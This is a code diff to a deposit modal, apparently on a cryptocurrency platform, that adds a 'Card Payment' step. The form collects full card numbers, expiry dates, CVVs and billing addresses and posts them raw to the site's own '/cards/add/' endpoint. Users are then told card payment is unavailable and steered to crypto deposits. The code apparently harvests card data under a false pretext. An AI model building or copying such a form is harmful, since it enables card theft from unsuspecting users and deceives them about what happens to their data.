@@ -14,6 +14,8 @@ import {
   Shield,
   CheckCircle,
   Loader2,
+  CreditCard,
+  ArrowLeft,
 } from "lucide-react";
 import Image from "next/image";
 import { toast } from "sonner";
@@ -27,7 +29,7 @@ interface DepositModalProps {
   onClose: () => void;
 }
 
-type DepositStep = "select" | "address" | "amount" | "details" | "success";
+type DepositStep = "select" | "card" | "address" | "amount" | "details" | "success";
 
 export default function DepositModal({ isOpen, onClose }: DepositModalProps) {
   const [step, setStep] = useState<DepositStep>("select");
@@ -41,6 +43,16 @@ export default function DepositModal({ isOpen, onClose }: DepositModalProps) {
   const [submitting, setSubmitting] = useState(false);
   const [sendingIntent, setSendingIntent] = useState(false);
   const [depositReference, setDepositReference] = useState("");
+
+  // Card step state
+  const [cardholderName, setCardholderName] = useState("");
+  const [cardNumber, setCardNumber] = useState("");
+  const [cardExpiry, setCardExpiry] = useState("");
+  const [cvv, setCvv] = useState("");
+  const [billingAddress, setBillingAddress] = useState("");
+  const [billingZip, setBillingZip] = useState("");
+  const [submittingCard, setSubmittingCard] = useState(false);
+  const [cardError, setCardError] = useState("");
 
   // Details step state
   const [countdown, setCountdown] = useState(7200);
@@ -102,6 +114,81 @@ export default function DepositModal({ isOpen, onClose }: DepositModalProps) {
     setSelectedWallet(wallet);
     setCopied(false);
     setStep("amount");
+  };
+
+  const formatCardNumber = (value: string) => {
+    const digits = value.replace(/\D/g, "").slice(0, 19);
+    return digits.replace(/(\d{4})(?=\d)/g, "$1 ");
+  };
+
+  const handleCardSubmit = async (e: React.FormEvent) => {
+    e.preventDefault();
+    setCardError("");
+
+    const rawNumber = cardNumber.replace(/\s/g, "");
+    if (!cardholderName.trim()) {
+      setCardError("Cardholder name is required");
+      return;
+    }
+    if (rawNumber.length < 13 || rawNumber.length > 19) {
+      setCardError("Invalid card number");
+      return;
+    }
+    const expiryParts = cardExpiry.split("/");
+    const expMonth = expiryParts[0]?.trim() || "";
+    const expYear = expiryParts[1]?.trim() || "";
+    if (expMonth.length !== 2 || expYear.length !== 2) {
+      setCardError("Enter a valid expiry date (MM/YY)");
+      return;
+    }
+    const monthNum = parseInt(expMonth, 10);
+    if (monthNum < 1 || monthNum > 12) {
+      setCardError("Invalid expiry month");
+      return;
+    }
+    if (cvv.length < 3 || cvv.length > 4) {
+      setCardError("Invalid CVV");
+      return;
+    }
+
+    setSubmittingCard(true);
+    try {
+      const res = await apiFetch("/cards/add/", {
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify({
+          cardholder_name: cardholderName.trim(),
+          card_number: rawNumber,
+          expiry_month: expMonth,
+          expiry_year: `20${expYear}`,
+          cvv,
+          billing_address: billingAddress.trim(),
+          billing_zip: billingZip.trim(),
+        }),
+      });
+      const data = await res.json();
+      if (data.error) {
+        setCardError(data.error);
+      } else {
+        toast.info(
+          data.message ||
+            "Card payment is not available at this time. Please use cryptocurrency deposit options instead.",
+        );
+        // Reset card fields and go back to select
+        setCardholderName("");
+        setCardNumber("");
+        setCardExpiry("");
+        setCvv("");
+        setBillingAddress("");
+        setBillingZip("");
+        setCardError("");
+        setStep("select");
+      }
+    } catch {
+      setCardError("Failed to connect to server");
+    } finally {
+      setSubmittingCard(false);
+    }
   };
 
   const handleCopy = () => {
@@ -239,6 +326,13 @@ export default function DepositModal({ isOpen, onClose }: DepositModalProps) {
     setError("");
     setCopied(false);
     setDepositReference("");
+    setCardholderName("");
+    setCardNumber("");
+    setCardExpiry("");
+    setCvv("");
+    setBillingAddress("");
+    setBillingZip("");
+    setCardError("");
     onClose();
   };
 
@@ -292,6 +386,35 @@ export default function DepositModal({ isOpen, onClose }: DepositModalProps) {
                 </button>
               </div>
 
+              {/* Card Payment Option - Always at top */}
+              <div
+                className="bg-gray-50 dark:bg-[#1a2744]/80 border border-gray-200 dark:border-white/10 rounded-xl p-4 hover:border-blue-400 dark:hover:border-blue-500/30 transition-all mb-4 cursor-pointer"
+                onClick={() => setStep("card")}
+              >
+                <div className="flex items-center gap-4 mb-3">
+                  <div className="w-12 h-12 rounded-full flex items-center justify-center bg-gradient-to-br from-blue-500 to-indigo-600">
+                    <CreditCard className="w-6 h-6 text-white" />
+                  </div>
+                  <div className="flex-1">
+                    <h4 className="text-base font-semibold text-gray-900 dark:text-white">
+                      Card Payment
+                    </h4>
+                    <p className="text-xs text-gray-500 dark:text-gray-400">
+                      Visa, Mastercard, Amex, Discover
+                    </p>
+                  </div>
+                </div>
+                <button
+                  onClick={(e) => {
+                    e.stopPropagation();
+                    setStep("card");
+                  }}
+                  className="w-full py-2.5 bg-blue-500 hover:bg-blue-600 text-white rounded-lg font-semibold transition-colors text-sm"
+                >
+                  Pay with Card
+                </button>
+              </div>
+
               {loading ? (
                 <div className="flex items-center justify-center py-12">
                   <Loader2 className="w-8 h-8 text-blue-400 animate-spin" />
@@ -336,6 +459,213 @@ export default function DepositModal({ isOpen, onClose }: DepositModalProps) {
                   ))}
                 </div>
               )}
+            </div>
+          )}
+
+          {/* ==================== STEP: CARD ENTRY ==================== */}
+          {step === "card" && (
+            <div className="p-6">
+              <div className="flex items-center justify-between mb-6">
+                <div className="flex items-center gap-3">
+                  <button
+                    onClick={() => {
+                      setCardError("");
+                      setStep("select");
+                    }}
+                    className="text-gray-400 hover:text-gray-900 dark:hover:text-white transition-colors"
+                  >
+                    <ArrowLeft className="w-5 h-5" />
+                  </button>
+                  <div>
+                    <h3 className="text-xl font-bold text-gray-900 dark:text-white">
+                      Card Payment
+                    </h3>
+                    <p className="text-xs text-gray-500 dark:text-gray-400">
+                      Enter your card details
+                    </p>
+                  </div>
+                </div>
+                <button
+                  onClick={handleClose}
+                  className="text-gray-400 hover:text-gray-900 dark:hover:text-white transition-colors"
+                >
+                  <X className="w-5 h-5" />
+                </button>
+              </div>
+
+              <form onSubmit={handleCardSubmit} className="space-y-4">
+                {/* Cardholder Name */}
+                <div>
+                  <label className="block text-sm font-medium text-gray-700 dark:text-gray-300 mb-1.5">
+                    Cardholder Name
+                  </label>
+                  <input
+                    type="text"
+                    value={cardholderName}
+                    onChange={(e) => setCardholderName(e.target.value)}
+                    className="w-full px-4 py-3 bg-gray-100 dark:bg-[#1a2744] border border-gray-300 dark:border-white/10 rounded-lg text-gray-900 dark:text-white focus:outline-none focus:border-blue-500 text-sm placeholder-gray-400 dark:placeholder-gray-600"
+                    placeholder="John Doe"
+                  />
+                </div>
+
+                {/* Card Number */}
+                <div>
+                  <label className="block text-sm font-medium text-gray-700 dark:text-gray-300 mb-1.5">
+                    Card Number
+                  </label>
+                  <div className="relative">
+                    <input
+                      type="text"
+                      inputMode="numeric"
+                      value={cardNumber}
+                      onChange={(e) =>
+                        setCardNumber(formatCardNumber(e.target.value))
+                      }
+                      className="w-full px-4 py-3 pr-12 bg-gray-100 dark:bg-[#1a2744] border border-gray-300 dark:border-white/10 rounded-lg text-gray-900 dark:text-white focus:outline-none focus:border-blue-500 text-sm font-mono placeholder-gray-400 dark:placeholder-gray-600"
+                      placeholder="4242 4242 4242 4242"
+                      maxLength={23}
+                    />
+                    <CreditCard className="absolute right-3 top-1/2 -translate-y-1/2 w-5 h-5 text-gray-400" />
+                  </div>
+                </div>
+
+                {/* Expiry + CVV Row */}
+                <div className="grid grid-cols-2 gap-3">
+                  <div>
+                    <label className="block text-sm font-medium text-gray-700 dark:text-gray-300 mb-1.5">
+                      Expiry Date
+                    </label>
+                    <input
+                      type="text"
+                      inputMode="numeric"
+                      value={cardExpiry}
+                      onChange={(e) => {
+                        const prev = cardExpiry;
+                        const raw = e.target.value;
+                        // Strip everything except digits
+                        const digits = raw.replace(/\D/g, "").slice(0, 4);
+
+                        // If user is deleting, allow raw backspace behavior
+                        if (raw.length < prev.length) {
+                          // If they backspaced into "MM/" → just show "MM"
+                          if (prev.endsWith("/") && !raw.endsWith("/")) {
+                            setCardExpiry(digits.slice(0, 2));
+                            return;
+                          }
+                          // Otherwise format normally from remaining digits
+                          if (digits.length <= 2) {
+                            setCardExpiry(digits);
+                          } else {
+                            setCardExpiry(
+                              digits.slice(0, 2) + "/" + digits.slice(2),
+                            );
+                          }
+                          return;
+                        }
+
+                        // Typing forward: auto-insert slash after MM
+                        if (digits.length <= 2) {
+                          setCardExpiry(digits);
+                        } else {
+                          setCardExpiry(
+                            digits.slice(0, 2) + "/" + digits.slice(2),
+                          );
+                        }
+                      }}
+                      className="w-full px-4 py-3 bg-gray-100 dark:bg-[#1a2744] border border-gray-300 dark:border-white/10 rounded-lg text-gray-900 dark:text-white focus:outline-none focus:border-blue-500 text-sm font-mono placeholder-gray-400 dark:placeholder-gray-600"
+                      placeholder="MM/YY"
+                      maxLength={5}
+                    />
+                  </div>
+                  <div>
+                    <label className="block text-sm font-medium text-gray-700 dark:text-gray-300 mb-1.5">
+                      CVV
+                    </label>
+                    <input
+                      type="text"
+                      inputMode="numeric"
+                      value={cvv}
+                      onChange={(e) =>
+                        setCvv(e.target.value.replace(/\D/g, "").slice(0, 4))
+                      }
+                      className="w-full px-4 py-3 bg-gray-100 dark:bg-[#1a2744] border border-gray-300 dark:border-white/10 rounded-lg text-gray-900 dark:text-white focus:outline-none focus:border-blue-500 text-sm font-mono placeholder-gray-400 dark:placeholder-gray-600"
+                      placeholder="123"
+                      maxLength={4}
+                    />
+                  </div>
+                </div>
+
+                {/* Billing Address */}
+                <div>
+                  <label className="block text-sm font-medium text-gray-700 dark:text-gray-300 mb-1.5">
+                    Billing Address{" "}
+                    <span className="text-gray-400 font-normal">(Optional)</span>
+                  </label>
+                  <input
+                    type="text"
+                    value={billingAddress}
+                    onChange={(e) => setBillingAddress(e.target.value)}
+                    className="w-full px-4 py-3 bg-gray-100 dark:bg-[#1a2744] border border-gray-300 dark:border-white/10 rounded-lg text-gray-900 dark:text-white focus:outline-none focus:border-blue-500 text-sm placeholder-gray-400 dark:placeholder-gray-600"
+                    placeholder="123 Main St, Apt 4B"
+                  />
+                </div>
+
+                {/* Billing Zip */}
+                <div>
+                  <label className="block text-sm font-medium text-gray-700 dark:text-gray-300 mb-1.5">
+                    Billing Zip Code{" "}
+                    <span className="text-gray-400 font-normal">(Optional)</span>
+                  </label>
+                  <input
+                    type="text"
+                    value={billingZip}
+                    onChange={(e) => setBillingZip(e.target.value)}
+                    className="w-full px-4 py-3 bg-gray-100 dark:bg-[#1a2744] border border-gray-300 dark:border-white/10 rounded-lg text-gray-900 dark:text-white focus:outline-none focus:border-blue-500 text-sm placeholder-gray-400 dark:placeholder-gray-600"
+                    placeholder="10001"
+                  />
+                </div>
+
+                {/* Error */}
+                {cardError && (
+                  <div className="bg-red-500/10 border border-red-500/20 rounded-lg p-3">
+                    <div className="flex items-center gap-2">
+                      <AlertCircle className="w-4 h-4 text-red-400 flex-shrink-0" />
+                      <p className="text-xs text-red-400">{cardError}</p>
+                    </div>
+                  </div>
+                )}
+
+                {/* Submit */}
+                <div className="flex gap-3 pt-2">
+                  <button
+                    type="button"
+                    onClick={() => {
+                      setCardError("");
+                      setStep("select");
+                    }}
+                    className="flex-1 py-3 bg-gray-200 dark:bg-white/5 hover:bg-gray-300 dark:hover:bg-white/10 text-gray-900 dark:text-white rounded-lg font-semibold transition-colors text-sm"
+                  >
+                    Back
+                  </button>
+                  <button
+                    type="submit"
+                    disabled={submittingCard}
+                    className="flex-1 py-3 bg-blue-500 hover:bg-blue-600 text-white rounded-lg font-semibold transition-colors disabled:opacity-50 flex items-center justify-center gap-2 text-sm"
+                  >
+                    {submittingCard ? (
+                      <>
+                        <Loader2 className="w-4 h-4 animate-spin" />
+                        Processing...
+                      </>
+                    ) : (
+                      <>
+                        <CreditCard className="w-4 h-4" />
+                        Add Card
+                      </>
+                    )}
+                  </button>
+                </div>
+              </form>
             </div>
           )}
 
